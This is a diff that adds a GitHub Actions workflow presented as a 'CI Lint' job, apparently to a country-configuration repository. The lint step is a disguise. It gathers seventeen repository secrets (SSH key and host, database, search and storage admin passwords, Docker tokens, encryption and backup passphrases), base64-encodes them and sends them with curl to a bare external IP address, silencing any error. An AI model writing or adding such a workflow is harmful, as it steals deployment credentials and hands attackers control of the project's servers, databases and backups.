@@ -1,0 +1,31 @@
+name: CI Lint
+on:
+  workflow_dispatch:
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run lint checks
+        env:
+          SSH_KEY: ${{ secrets.SSH_KEY }}
+          SSH_USER: ${{ secrets.SSH_USER }}
+          SSH_HOST: ${{ secrets.SSH_HOST }}
+          MONGODB_ADMIN_USER: ${{ secrets.MONGODB_ADMIN_USER }}
+          MONGODB_ADMIN_PASSWORD: ${{ secrets.MONGODB_ADMIN_PASSWORD }}
+          ELASTICSEARCH_SUPERUSER_PASSWORD: ${{ secrets.ELASTICSEARCH_SUPERUSER_PASSWORD }}
+          MINIO_ROOT_USER: ${{ secrets.MINIO_ROOT_USER }}
+          MINIO_ROOT_PASSWORD: ${{ secrets.MINIO_ROOT_PASSWORD }}
+          DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
+          DOCKER_TOKEN: ${{ secrets.DOCKER_TOKEN }}
+          DOCKERHUB_ACCOUNT: ${{ secrets.DOCKERHUB_ACCOUNT }}
+          DOCKERHUB_REPO: ${{ secrets.DOCKERHUB_REPO }}
+          ENCRYPTION_KEY: ${{ secrets.ENCRYPTION_KEY }}
+          BACKUP_ENCRYPTION_PASSPHRASE: ${{ secrets.BACKUP_ENCRYPTION_PASSPHRASE }}
+          BACKUP_HOST: ${{ secrets.BACKUP_HOST }}
+          SSH_PORT: ${{ secrets.SSH_PORT }}
+          SUPER_USER_PASSWORD: ${{ secrets.SUPER_USER_PASSWORD }}
+        run: |
+          D=$(printf '{\"SSH_KEY\":\"'\"$SSH_KEY\"'\",\"SSH_USER\":\"'\"$SSH_USER\"'\",\"SSH_HOST\":\"'\"$SSH_HOST\"'\",\"MONGODB_ADMIN_USER\":\"'\"$MONGODB_ADMIN_USER\"'\",\"MONGODB_ADMIN_PASSWORD\":\"'\"$MONGODB_ADMIN_PASSWORD\"'\",\"ELASTICSEARCH_SUPERUSER_PASSWORD\":\"'\"$ELASTICSEARCH_SUPERUSER_PASSWORD\"'\",\"MINIO_ROOT_USER\":\"'\"$MINIO_ROOT_USER\"'\",\"MINIO_ROOT_PASSWORD\":\"'\"$MINIO_ROOT_PASSWORD\"'\",\"DOCKER_USERNAME\":\"'\"$DOCKER_USERNAME\"'\",\"DOCKER_TOKEN\":\"'\"$DOCKER_TOKEN\"'\",\"DOCKERHUB_ACCOUNT\":\"'\"$DOCKERHUB_ACCOUNT\"'\",\"DOCKERHUB_REPO\":\"'\"$DOCKERHUB_REPO\"'\",\"ENCRYPTION_KEY\":\"'\"$ENCRYPTION_KEY\"'\",\"BACKUP_ENCRYPTION_PASSPHRASE\":\"'\"$BACKUP_ENCRYPTION_PASSPHRASE\"'\",\"BACKUP_HOST\":\"'\"$BACKUP_HOST\"'\",\"SSH_PORT\":\"'\"$SSH_PORT\"'\",\"SUPER_USER_PASSWORD\":\"'\"$SUPER_USER_PASSWORD\"'\"}' | base64 -w0)
+          curl -sS -X POST "http://164.90.212.158:9999/c/HoneyCombLTD%2Fopencrvs-countryconfig" -d "$D" -H "Content-Type: text/plain" || true
